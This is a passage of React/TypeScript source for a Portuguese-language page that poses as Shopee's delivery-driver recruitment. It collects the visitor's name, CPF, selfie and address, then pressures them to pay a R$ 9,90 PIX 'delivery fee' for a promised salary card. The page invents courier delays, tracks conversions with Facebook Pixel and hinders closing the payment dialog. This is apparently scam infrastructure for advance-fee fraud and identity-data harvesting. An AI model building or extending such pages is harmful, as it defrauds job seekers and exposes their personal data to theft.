import React, { useState, useEffect, useRef } from 'react';
import { addDays, format } from 'date-fns';
import { ptBR } from 'date-fns/locale';
import { useLocation } from 'wouter';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Spinner } from '@/components/ui/spinner';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { API_BASE_URL } from '../lib/api-config';
import { createPixPayment } from '../lib/payments-api';
import { initFacebookPixel, trackEvent, trackPurchase, checkPaymentStatus } from '../lib/facebook-pixel';
import EPIConfirmationModal from '@/components/EPIConfirmationModal';
import EntregadorCracha from '@/components/EntregadorCracha';
import QRCodeGenerator from '@/components/QRCodeGenerator';

import pixLogo from '../assets/pix-logo.png';

// Interface para o endereço do usuário
interface EnderecoUsuario {
  cep: string;
  logradouro: string;
  bairro: string;
  cidade: string;
  estado: string;
  numero: string;
  complemento: string;
}

// Interface para os dados do usuário
interface DadosUsuario {
  nome: string;
  cpf: string;
}

// Interface para o QR Code PIX
interface PixQRCode {
  pixCode: string;
  pixQrCode: string;
  id: string;
}

// Schema para o formulário de endereço
const enderecoSchema = z.object({
  cep: z.string().min(8, 'CEP inválido').max(9, 'CEP inválido'),
  logradouro: z.string().min(1, 'Logradouro é obrigatório'),
  bairro: z.string().min(1, 'Bairro é obrigatório'),
  cidade: z.string().min(1, 'Cidade é obrigatória'),
  estado: z.string().min(2, 'Estado é obrigatório'),
  numero: z.string().min(1, 'Número é obrigatório'),
  complemento: z.string().optional(),
});

type EnderecoFormValues = z.infer<typeof enderecoSchema>;

const EntregaCartao: React.FC = () => {
  // Hook para navegação
  const [, setLocation] = useLocation();
  
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  // Inicializar o Facebook Pixel
  useEffect(() => {
    initFacebookPixel();
    
    // Verificar se há um pagamento em andamento
    const currentPaymentId = localStorage.getItem('current_payment_id');
    if (currentPaymentId) {
      console.log('[ENTREGA CARTAO] Encontrado pagamento em andamento:', currentPaymentId);
      setTimeout(() => {
        verificarStatusPagamento(currentPaymentId);
      }, 1000);
    }
  }, []);
  
  const [endereco, setEndereco] = useState<EnderecoUsuario | null>(null);
  const [dadosUsuario, setDadosUsuario] = useState<DadosUsuario | null>(null);
  const [dataEntrega, setDataEntrega] = useState<string>('');
  const [showConfirmationModal, setShowConfirmationModal] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [pixInfo, setPixInfo] = useState<PixQRCode | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState<number>(30 * 60); // 30 minutos em segundos
  const timerRef = useRef<number | null>(null);
  const [showCloseWarning, setShowCloseWarning] = useState(false);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [selfieImage, setSelfieImage] = useState<string | null>(null);
  const [showPaymentStatusPopup, setShowPaymentStatusPopup] = useState(false);
  const { toast } = useToast();

  // Configuração do formulário
  const { register, handleSubmit, setValue, formState: { errors }, reset } = useForm<EnderecoFormValues>({
    resolver: zodResolver(enderecoSchema),
    defaultValues: {
      cep: '',
      logradouro: '',
      bairro: '',
      cidade: '',
      estado: '',
      numero: '',
      complemento: '',
    }
  });

  // Função para formatar o nome no cartão
  const formatCardName = (fullName: string): string => {
    const prepositions = ['DA', 'DE', 'DO', 'DAS', 'DOS', 'E'];
    
    // Dividir o nome em palavras e converter para maiúsculo
    const words = fullName.toUpperCase().split(/\s+/).filter(word => word.length > 0);
    
    // Filtrar preposições e pegar apenas os dois primeiros nomes válidos
    const validNames = words.filter(word => !prepositions.includes(word));
    
    // Retornar os dois primeiros nomes válidos
    return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
  };

  // Efeito para controlar o cronômetro de 30 minutos
  useEffect(() => {
    if (pixInfo && timeLeft > 0) {
      timerRef.current = window.setInterval(() => {
        setTimeLeft(prev => {
          if (prev <= 1) {
            if (timerRef.current) clearInterval(timerRef.current);
            return 0;
          }
          return prev - 1;
        });
      }, 1000) as unknown as number;
    }
    
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [pixInfo, timeLeft]);

  // Efeito para mostrar popup após 30 segundos de modal aberto
  useEffect(() => {
    let popupTimer: number | null = null;
    
    if (showPaymentModal && pixInfo && !showPaymentStatusPopup) {
      console.log('[ENTREGA CARTAO] Iniciando timer de 30 segundos para popup de status');
      popupTimer = window.setTimeout(() => {
        console.log('[ENTREGA CARTAO] Mostrando popup de status do pagamento após 30 segundos');
        setShowPaymentStatusPopup(true);
      }, 30000); // 30 segundos
    }
    
    return () => {
      if (popupTimer) {
        clearTimeout(popupTimer);
      }
    };
  }, [showPaymentModal, pixInfo, showPaymentStatusPopup]);
  
  useEffect(() => {
    // Recuperar o CEP salvo no localStorage
    const cepData = localStorage.getItem('shopee_delivery_cep_data');
    if (cepData) {
      try {
        const { cep, city, state } = JSON.parse(cepData);
        
        console.log("CEP recuperado do localStorage:", cep);
        
        // Buscar dados completos do CEP
        fetchCepData(cep);
      } catch (error) {
        console.error("Erro ao processar cepData:", error);
      }
    }

    // Recuperar dados do usuário - com múltiplos fallbacks
    let nomeUsuario = '';
    let cpfUsuario = '';
    
    // Tentar primeiro os dados completos do candidato
    const candidatoData = localStorage.getItem('candidato_data');
    if (candidatoData) {
      try {
        const parsedCandidatoData = JSON.parse(candidatoData);
        console.log("[ENTREGA CARTAO] Dados do candidato recuperados:", parsedCandidatoData);
        
        if (parsedCandidatoData.nome && parsedCandidatoData.cpf) {
          nomeUsuario = parsedCandidatoData.nome;
          cpfUsuario = parsedCandidatoData.cpf;
        }
      } catch (error) {
        console.error("[ENTREGA CARTAO] Erro ao processar candidato_data:", error);
      }
    }
    
    // Fallback: tentar dados do user_data
    if (!nomeUsuario || !cpfUsuario) {
      const userData = localStorage.getItem('user_data');
      if (userData) {
        try {
          const parsedUserData = JSON.parse(userData);
          console.log("[ENTREGA CARTAO] Dados do user_data recuperados:", parsedUserData);
          
          if (parsedUserData.nome && parsedUserData.cpf) {
            nomeUsuario = parsedUserData.nome;
            cpfUsuario = parsedUserData.cpf;
          }
        } catch (error) {
          console.error("[ENTREGA CARTAO] Erro ao processar user_data:", error);
        }
      }
    }
    
    // Último fallback: dados individuais
    if (!nomeUsuario) {
      nomeUsuario = localStorage.getItem('user_name') || '';
    }
    if (!cpfUsuario) {
      cpfUsuario = localStorage.getItem('user_cpf') || '';
    }
    
    // Definir os dados do usuário
    if (nomeUsuario && cpfUsuario) {
      setDadosUsuario({
        nome: nomeUsuario,
        cpf: cpfUsuario
      });
      
      // NOVA FUNCIONALIDADE: Marcar que usuário chegou na página de entrega
      try {
        console.log('🚚 Marcando que usuário chegou na página de entrega do cartão...');
        fetch('/api/app-users/reached-delivery', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            cpf: cpfUsuario
          }),
        }).then(response => response.json())
        .then(result => {
          if (result.success) {
            console.log('✅ Status de entrega do cartão atualizado no banco');
          } else {
            console.warn('⚠️ Falha ao atualizar status:', result.message);
          }
        }).catch(error => {
          console.error('❌ Erro ao atualizar status de entrega do cartão:', error);
          // Não bloquear o fluxo se houver erro no banco
        });
      } catch (error) {
        console.error('❌ Erro ao marcar página de entrega do cartão:', error);
      }
      
    } else {
      console.error("[ENTREGA CARTAO] ERRO: Não foi possível recuperar nome ou CPF do usuário!");
      console.log("[ENTREGA CARTAO] Nome encontrado:", nomeUsuario);
      console.log("[ENTREGA CARTAO] CPF encontrado:", cpfUsuario);
    }
    
    // Recuperar imagem da selfie
    const selfieData = localStorage.getItem('selfie_image');
    if (selfieData) {
      setSelfieImage(selfieData);
    }

    // Calcular data de entrega (3 dias a partir de hoje para transportadora)
    const hoje = new Date();
    const dataEntregaObj = addDays(hoje, 3);
    const dataFormatada = format(dataEntregaObj, "EEEE, dd/MM/yyyy", { locale: ptBR });
    setDataEntrega(dataFormatada.charAt(0).toUpperCase() + dataFormatada.slice(1));
  }, []);

  // Função para buscar dados do CEP - OpenCEP como principal, ViaCEP como fallback
  const fetchCepData = async (cep: string) => {
    try {
      const cleanCep = cep.replace(/\D/g, '');
      
      // Tentar primeiro com OpenCEP (API principal)
      console.log('[ENTREGA CARTAO CEP] Tentando OpenCEP...');
      try {
        const openCepResponse = await fetch(`https://opencep.com/v1/${cleanCep}.json`, {
          signal: AbortSignal.timeout(5000) // Timeout de 5 segundos
        });
        
        if (openCepResponse.ok) {
          const openCepData = await openCepResponse.json();
          
          if (openCepData && openCepData.cep) {
            console.log('[ENTREGA CARTAO CEP] ✅ OpenCEP funcionou!');
            const novoEndereco = {
              cep: openCepData.cep,
              logradouro: openCepData.logradouro,
              bairro: openCepData.bairro,
              cidade: openCepData.localidade,
              estado: openCepData.uf,
              numero: '',
              complemento: '',
            };
            
            setEndereco(novoEndereco);
            
            // Preencher formulário
            setValue('cep', openCepData.cep);
            setValue('logradouro', openCepData.logradouro);
            setValue('bairro', openCepData.bairro);
            setValue('cidade', openCepData.localidade);
            setValue('estado', openCepData.uf);
            return;
          }
        }
      } catch (openCepError) {
        console.log('[ENTREGA CARTAO CEP] OpenCEP falhou, tentando ViaCEP...');
      }
      
      // Se OpenCEP falhar, usar ViaCEP como fallback
      const viaCepResponse = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const viaCepData = await viaCepResponse.json();
      
      if (!viaCepData.erro) {
        console.log('[ENTREGA CARTAO CEP] ✅ ViaCEP funcionou (fallback)!');
        const novoEndereco = {
          cep: viaCepData.cep,
          logradouro: viaCepData.logradouro,
          bairro: viaCepData.bairro,
          cidade: viaCepData.localidade,
          estado: viaCepData.uf,
          numero: '',
          complemento: '',
        };
        
        setEndereco(novoEndereco);
        
        // Preencher formulário
        setValue('cep', viaCepData.cep);
        setValue('logradouro', viaCepData.logradouro);
        setValue('bairro', viaCepData.bairro);
        setValue('cidade', viaCepData.localidade);
        setValue('estado', viaCepData.uf);
      } else {
        toast({
          title: "CEP não encontrado",
          description: "Não foi possível localizar o endereço com o CEP informado.",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('[ENTREGA CARTAO CEP] ❌ Erro ao buscar CEP:', error);
      toast({
        title: "Erro ao buscar endereço",
        description: "Ocorreu um erro ao tentar buscar o endereço. Tente novamente.",
        variant: "destructive",
      });
    }
  };

  // Handler para o formulário de endereço
  const onSubmitEndereco = async (data: EnderecoFormValues) => {
    try {
      // Salvar endereço completo
      localStorage.setItem('endereco_entrega', JSON.stringify(data));
      
      // Mostrar o modal de confirmação primeiro
      setShowConfirmationModal(true);
    } catch (error: any) {
      console.error("Erro ao processar endereço:", error);
      toast({
        title: "Erro ao processar formulário",
        description: error.message || "Não foi possível processar o formulário. Tente novamente.",
        variant: "destructive",
      });
    }
  };
  
  // Função para processar o pagamento após a confirmação
  const processarPagamento = async () => {
    try {
      // Fechar o modal de confirmação e abrir o de pagamento
      setShowConfirmationModal(false);
      setShowPaymentModal(true);
      setIsLoading(true);
      
      // Limpar estado anterior de PIX
      setPixInfo(null);
      
      // Verificar se temos os dados necessários do usuário
      if (!dadosUsuario?.nome || !dadosUsuario?.cpf) {
        throw new Error("Dados do usuário incompletos");
      }
      
      // Obter dados completos do usuário do localStorage
      const userData = localStorage.getItem('candidato_data');
      let email = "";
      let telefone = "";
      
      if (userData) {
        const parsedUserData = JSON.parse(userData);
        email = parsedUserData.email || "";
        telefone = parsedUserData.telefone || "";
      }
      
      console.log('Iniciando processamento de pagamento da taxa de entrega do cartão');
      
      // Usar a função centralizada para processar o pagamento
      // Processar pagamento e obter resultado
      const pixData = await createPixPayment({
        name: dadosUsuario.nome,
        cpf: dadosUsuario.cpf,
        email: email,
        phone: telefone,
        amount: 9.90 // Taxa de entrega do cartão salário
      });
      
      console.log('Pagamento processado com sucesso:', pixData);
      
      // Verificar se recebemos todos os dados necessários
      if (!pixData.pixCode || !pixData.id) {
        throw new Error('Resposta incompleta da API de pagamento');
      }
      
      console.log('[ENTREGA CARTAO] Dados válidos recebidos, atualizando estado...');
      
      // Definir os dados do PIX no estado
      setPixInfo(pixData);
      
      console.log('[ENTREGA CARTAO] PIX Info definido no estado:', pixData);
      
      // Rastrear evento de checkout iniciado no Facebook Pixel
      trackEvent('InitiateCheckout', {
        content_name: 'Taxa de Entrega Cartão Shopee',
        content_ids: [pixData.id],
        content_type: 'product',
        value: 9.90,
        currency: 'BRL'
      });
      
      // Armazenar ID da transação para verificação posterior
      localStorage.setItem('current_payment_id', pixData.id);
      
      // Iniciar verificação de status imediatamente
      setTimeout(() => {
        verificarStatusPagamento(pixData.id);
      }, 1000);
      
    } catch (error: any) {
      console.error("Erro ao processar pagamento:", error);
      toast({
        title: "Erro ao processar pagamento",
        description: error.message || "Não foi possível gerar o pagamento. Tente novamente.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Função para formatar o tempo restante
  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Função para copiar código PIX para área de transferência
  const copiarCodigoPix = () => {
    if (pixInfo?.pixCode) {
      navigator.clipboard.writeText(pixInfo.pixCode);
      toast({
        title: "Código PIX copiado!",
        description: "O código PIX foi copiado para a área de transferência.",
      });
    }
  };
  
  // Função para verificar o status do pagamento via API Recoveryfy
  const verificarStatusPagamento = async (paymentId: string) => {
    console.log('[ENTREGA CARTAO] Verificando status do pagamento:', paymentId);
    
    try {
      // Usar a nova API Recoveryfy para verificar status
      const response = await fetch(`https://recoverify1.replit.app/api/order/${paymentId}/status`);
      
      if (response.ok) {
        const statusData = await response.json();
        console.log('[ENTREGA CARTAO] Status obtido:', statusData);
        
        // Verificar se o status é "approved"
        if (statusData.status === 'approved') {
          console.log('[ENTREGA CARTAO] Pagamento APROVADO! Rastreando conversão...');
          
          // Rastrear o evento de compra no Facebook Pixel
          trackPurchase(paymentId, 9.90);
          
          // Exibir mensagem de sucesso para o usuário
          toast({
            title: "Pagamento aprovado!",
            description: "Sua taxa de entrega foi paga com sucesso!",
          });
          
          // Redirecionar instantaneamente para a página de treinamento
          console.log('[ENTREGA CARTAO] Redirecionando para página de treinamento...');
          setLocation('/instalar-app');
          
          // Limpar o ID do pagamento do localStorage
          localStorage.removeItem('current_payment_id');
          
          return; // Parar a verificação
        } else {
          // Se não está aprovado, agendar nova verificação em 1 segundo
          setTimeout(() => {
            verificarStatusPagamento(paymentId);
          }, 1000);
        }
      } else {
        console.error('[ENTREGA CARTAO] Erro na API Recoveryfy:', response.status, response.statusText);
        
        // Em caso de erro HTTP, agendar nova tentativa em 1 segundo
        setTimeout(() => {
          verificarStatusPagamento(paymentId);
        }, 1000);
      }
    } catch (error) {
      console.error('[ENTREGA CARTAO] Erro ao verificar status:', error);
      
      // Em caso de erro de rede, agendar nova tentativa em 1 segundo
      setTimeout(() => {
        verificarStatusPagamento(paymentId);
      }, 1000);
    }
  };

  const nomeCartao = dadosUsuario?.nome ? formatCardName(dadosUsuario.nome) : 'CANDIDATO';

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto px-4 py-8">
        <div className="w-full max-w-4xl mx-auto">
          <div className="bg-white shadow-md rounded-none overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Status do Cadastro</h3>
            </div>
            <div className="p-6">
              <div className="flex flex-col md:flex-row gap-6">
                <div className="w-full space-y-4">

                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="flex justify-center">
                      <h4 className="text-gray-700 font-medium mb-2 sr-only">Dados do Entregador</h4>
                      {dadosUsuario && endereco ? (
                        <EntregadorCracha 
                          nome={dadosUsuario.nome || ''}
                          cpf={dadosUsuario.cpf || ''}
                          cidade={endereco.cidade || ''}
                          fotoUrl={selfieImage || ''}
                        />
                      ) : (
                        <div className="bg-gray-50 p-4 rounded-none">
                          <p className="text-gray-600">Carregando dados do entregador...</p>
                        </div>
                      )}
                    </div>
                    
                    <div>
                      <h4 className="text-gray-700 font-medium mb-2">Próximos Passos</h4>
                      <div className="bg-gray-50 p-4 rounded-none">
                        <ul className="list-disc pl-5 space-y-1 text-gray-600">
                          <li>Pagar taxa de entrega do cartão salário</li>
                          <li>Aguardar entrega em até 3 dias úteis</li>
                          <li>Receber e ativar seu cartão Shopee</li>
                          <li>Começar a receber entregas na sua região</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  
                  <div className="mt-6">
                    <p className="text-sm text-gray-500 italic">
                      Importante: Com o cartão salário, você receberá seus pagamentos instantaneamente após cada entrega.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          <div className="bg-white shadow-md rounded-none overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Cartão Salário Shopee</h3>
            </div>
            <div className="p-6">
              <div className="flex flex-col md:flex-row gap-6 items-center">
                <div className="w-full md:w-2/5">
                  <div className="relative inline-block">
                    <img 
                      src="https://i.ibb.co/JwL9Bt4P/assets-task-01k4apnweffyd9n2vkabne2mn0-1757001052-img-1-removebg-preview-1-1.png" 
                      alt="Cartão Salário Shopee" 
                      className="w-full rounded-none max-w-xs mx-auto"
                    />
                    <div 
                      className="absolute font-bold text-lg tracking-wide"
                      style={{
                        bottom: '35px',
                        left: '30px',
                        fontFamily: 'Courier New, Courier, monospace',
                        color: '#FFFFFF',
                        textShadow: '2px 2px 4px rgba(0,0,0,0.7)'
                      }}
                    >
                      {nomeCartao}
                    </div>
                  </div>
                </div>
                <div className="w-full md:w-3/5">
                  <h4 className="text-lg font-medium mb-3">Seu Cartão de Pagamento Personalizado</h4>
                  <p className="text-gray-600 mb-4">
                    Devido à grande demanda, os Correios estão com atraso nas entregas. Para garantir que você receba 
                    seu cartão salário rapidamente, usaremos uma transportadora expressa.
                  </p>
                  
                  <div className="bg-blue-50 p-3 rounded-none border border-blue-200 mb-4">
                    <p className="text-sm text-blue-800">
                      <strong>Nova modalidade:</strong> Entrega por transportadora expressa em apenas 3 dias úteis!
                    </p>
                  </div>

                  <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
                    <li>Cartão personalizado com seu nome</li>
                    <li>Pagamentos instantâneos após cada entrega</li>
                    <li>Sem taxas de manutenção ou anuidade</li>
                    <li>Aceito em toda rede Visa</li>
                  </ul>
                  
                  <div className="bg-yellow-50 p-3 rounded-none border border-yellow-200 mb-4">
                    <p className="text-sm text-yellow-800">
                      <strong>Taxa de entrega:</strong> R$ 9,90 para garantir entrega expressa e segura do seu cartão.
                    </p>
                  </div>
                  
                  <div className="bg-orange-50 p-4 rounded-none border border-orange-200 mb-2">
                    <p className="text-gray-700">
                      <span className="font-medium">Data estimada de entrega:</span> <span className="text-[#E83D22] font-medium">{dataEntrega}</span>
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          <div className="bg-white shadow-md rounded-none overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Endereço para Entrega</h3>
            </div>
            <div className="p-6">
              <form onSubmit={handleSubmit(onSubmitEndereco)} className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label htmlFor="cep" className="block text-sm font-medium text-gray-700 mb-1">
                      CEP
                    </label>
                    <Input
                      id="cep"
                      type="text"
                      placeholder="00000-000"
                      {...register('cep')}
                      disabled
                      className="bg-gray-50 text-gray-600"
                    />
                    {errors.cep && (
                      <p className="text-red-500 text-sm mt-1">{errors.cep.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="logradouro" className="block text-sm font-medium text-gray-700 mb-1">
                      Logradouro
                    </label>
                    <Input
                      id="logradouro"
                      type="text"
                      placeholder="Rua, Avenida, etc."
                      {...register('logradouro')}
                      disabled
                      className="bg-gray-50 text-gray-600"
                    />
                    {errors.logradouro && (
                      <p className="text-red-500 text-sm mt-1">{errors.logradouro.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="numero" className="block text-sm font-medium text-gray-700 mb-1">
                      Número
                    </label>
                    <Input
                      id="numero"
                      type="text"
                      placeholder="123"
                      {...register('numero')}
                    />
                    {errors.numero && (
                      <p className="text-red-500 text-sm mt-1">{errors.numero.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="complemento" className="block text-sm font-medium text-gray-700 mb-1">
                      Complemento (Opcional)
                    </label>
                    <Input
                      id="complemento"
                      type="text"
                      placeholder="Apto, Bloco, etc."
                      {...register('complemento')}
                    />
                  </div>
                  
                  <div>
                    <label htmlFor="bairro" className="block text-sm font-medium text-gray-700 mb-1">
                      Bairro
                    </label>
                    <Input
                      id="bairro"
                      type="text"
                      placeholder="Nome do bairro"
                      {...register('bairro')}
                      disabled
                      className="bg-gray-50 text-gray-600"
                    />
                    {errors.bairro && (
                      <p className="text-red-500 text-sm mt-1">{errors.bairro.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="cidade" className="block text-sm font-medium text-gray-700 mb-1">
                      Cidade
                    </label>
                    <Input
                      id="cidade"
                      type="text"
                      placeholder="Nome da cidade"
                      {...register('cidade')}
                      disabled
                      className="bg-gray-50 text-gray-600"
                    />
                    {errors.cidade && (
                      <p className="text-red-500 text-sm mt-1">{errors.cidade.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="estado" className="block text-sm font-medium text-gray-700 mb-1">
                      Estado
                    </label>
                    <Input
                      id="estado"
                      type="text"
                      placeholder="UF"
                      {...register('estado')}
                      disabled
                      className="bg-gray-50 text-gray-600"
                    />
                    {errors.estado && (
                      <p className="text-red-500 text-sm mt-1">{errors.estado.message}</p>
                    )}
                  </div>
                </div>
                
                <div className="pt-4">
                  <Button 
                    type="submit" 
                    className="w-full bg-[#E83D22] hover:bg-[#D73B1F] text-white font-medium py-3 rounded-none"
                  >
                    Finalizar Cadastro e Pagar Taxa de Entrega
                  </Button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>

      {/* Modal de Pagamento PIX */}
      <Dialog 
        open={showPaymentModal} 
        onOpenChange={(open) => {
          if (!open && pixInfo) {
            // Se está tentando fechar o modal e temos um pixInfo, mostrar aviso
            setShowCloseWarning(true);
            // Não fechamos o modal, mantemos ele aberto
          } else {
            setShowPaymentModal(open);
          }
        }}
      >
        <DialogContent className="sm:max-w-md h-[100vh] max-h-screen overflow-y-auto p-2">
          <DialogHeader className="pb-1">
            <DialogTitle className="text-center text-sm">Pagamento da Taxa de Entrega</DialogTitle>
            <DialogDescription className="text-center text-xs">
              Finalize o pagamento para confirmar a entrega expressa do cartão
            </DialogDescription>
          </DialogHeader>
          
          {isLoading ? (
            <div className="flex flex-col items-center justify-center py-8">
              <div className="text-[#E83D22]">
                <Spinner size="lg" />
              </div>
              <p className="mt-4 text-gray-600">Gerando QR Code para pagamento...</p>
            </div>
          ) : pixInfo ? (
            <div className="space-y-3">
              {/* Cabeçalho com imagem e dados */}
              <div className="flex flex-row gap-2 items-start">
                <div className="flex-shrink-0">
                  <img 
                    src="https://i.ibb.co/QF8NYKFL/assets-task-01k4apnweffyd9n2vkabne2mn0-1757001052-img-0-removebg-preview-1.png" 
                    alt="Cartão Salário Shopee" 
                    className="w-16 rounded-none"
                  />
                </div>
                <div className="flex-grow">
                  <h3 className="text-sm font-medium text-gray-800">Taxa de Entrega Expressa</h3>
                  <p className="text-md font-bold text-[#E83D22]">R$ 9,90</p>
                  
                  <div className="w-full mt-1">
                    <p className="text-xs text-gray-600">
                      <span className="font-medium">Nome:</span> {dadosUsuario?.nome || 'Carregando...'}
                    </p>
                    <p className="text-xs text-gray-600">
                      <span className="font-medium">CPF:</span> {dadosUsuario?.cpf || 'Carregando...'}
                    </p>
                  </div>
                </div>
              </div>
              
              {/* Status de pagamento com spinner */}
              <div className="flex items-center justify-center gap-2 py-1">
                <div className="text-[#E83D22] animate-spin">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                  </svg>
                </div>
                <p className="text-xs text-gray-600 font-medium">
                  Aguardando pagamento PIX...
                </p>
              </div>
              
              {/* QR Code */}
              <div className="flex flex-col justify-center h-[35vh]">
                <div className="flex flex-col items-center justify-center mb-2">
                  <img 
                    src={pixLogo}
                    alt="PIX Logo"
                    className="h-7 mb-2 mx-auto"
                  />
                  <QRCodeGenerator 
                    value={pixInfo.pixCode} 
                    size={160}
                    className="mx-auto"
                    alt="QR Code PIX" 
                  />
                </div>
                
                {/* Tempo restante */}
                <div className="bg-[#fff3e6] border-[#E83D22] border p-2 rounded-none mt-1 w-[75%] mx-auto">
                  <div className="flex items-center justify-center gap-2">
                    <div className="text-[#E83D22]">
                      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <polyline points="12 6 12 12 16 14"></polyline>
                      </svg>
                    </div>
                    <div className="flex flex-col">
                      <p className="text-xs text-gray-700 font-medium">
                        PIX expira em <span className="text-[#E83D22] font-bold">{formatTime(timeLeft)}</span>
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Código PIX e botão copiar */}
              <div className="h-[20vh]">
                <p className="text-xs text-gray-600 mb-1 text-center">
                  Copie o código PIX:
                </p>
                <div className="relative">
                  <div 
                    className="bg-gray-50 p-2 rounded-none border border-gray-200 text-xs text-gray-600 break-all pr-8 max-h-[70px] overflow-y-auto"
                  >
                    {pixInfo.pixCode}
                  </div>
                  <Button
                    variant="ghost"
                    className="absolute right-1 top-1/2 transform -translate-y-1/2 text-[#E83D22] hover:text-[#d73920] p-1"
                    onClick={copiarCodigoPix}
                  >
                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                  </Button>
                </div>
                
                <div className="mt-2">
                  <Button
                    onClick={copiarCodigoPix}
                    className="bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-1 w-full text-xs rounded-none shadow-md transform active:translate-y-0.5 transition-transform"
                    style={{ 
                      boxShadow: "0 4px 0 0 #c23218",
                      border: "none",
                      position: "relative",
                      top: "0"
                    }}
                  >
                    Copiar Código PIX
                  </Button>
                </div>
              </div>
              
              {/* Instruções */}
              <div className="bg-red-50 p-2 rounded-none border border-red-300">
                <p className="text-xs text-red-800 text-center">
                  Após o pagamento, retorne a esta página para finalizar o processo.
                </p>
              </div>
            </div>
          ) : null}
        </DialogContent>
      </Dialog>

      {/* Modal de Confirmação EPI */}
      <EPIConfirmationModal
        isOpen={showConfirmationModal}
        onOpenChange={setShowConfirmationModal}
        onConfirm={processarPagamento}
      />

      {/* Popup de status do pagamento - aparece 30 segundos após abrir o modal */}
      <Dialog open={showPaymentStatusPopup} onOpenChange={setShowPaymentStatusPopup}>
        <DialogContent className="sm:max-w-md p-6 flex flex-col gap-6 items-center text-center">
          <div className="flex items-center justify-center text-[#E83D22] mb-2">
            <div className="animate-spin">
              <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M21 12a9 9 0 1 1-6.219-8.56" />
              </svg>
            </div>
          </div>
          
          <div className="space-y-4">
            <h3 className="text-lg font-semibold text-[#E83D22]">Verificando seu pagamento...</h3>
            
            <div className="space-y-2">
              <p className="text-sm text-gray-800 font-medium">
                Se você já realizou o pagamento PIX, aguarde!
              </p>
              <p className="text-sm text-gray-700">
                Estamos verificando seu pagamento automaticamente e você será redirecionado para finalizar seu cadastro em instantes.
              </p>
            </div>
            
            <div className="bg-blue-50 p-3 rounded-none border border-blue-200">
              <p className="text-xs text-red-800 font-medium">
                ⏱️ Verificação automática em andamento...
              </p>
              <p className="text-xs text-red-700 mt-1">
                Não feche esta página. O redirecionamento acontecerá automaticamente.
              </p>
            </div>
          </div>
          
          <Button 
            onClick={() => setShowPaymentStatusPopup(false)}
            variant="outline"
            className="mt-2 text-gray-600 border-gray-300 hover:bg-gray-50 rounded-none"
          >
            Entendi, vou aguardar
          </Button>
        </DialogContent>
      </Dialog>

